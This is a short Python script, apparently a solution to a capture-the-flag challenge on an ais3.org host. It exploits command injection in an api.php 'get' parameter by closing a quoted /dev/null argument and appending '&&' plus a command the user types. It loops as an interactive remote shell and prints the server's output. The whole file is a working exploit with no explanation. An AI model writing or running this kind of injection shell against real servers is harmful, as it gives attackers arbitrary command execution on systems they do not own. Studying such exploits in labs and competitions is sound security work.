import requests

url = "https://squirrel.ais3.org/api.php?get=%2Fdev%2Fnull' %26%26 {}'"

while True:
    cmd = input("$ ")
    print("\n".join(requests.get(url.format(cmd)).text[11:-2].replace("\\/", "/").split("\\n")))
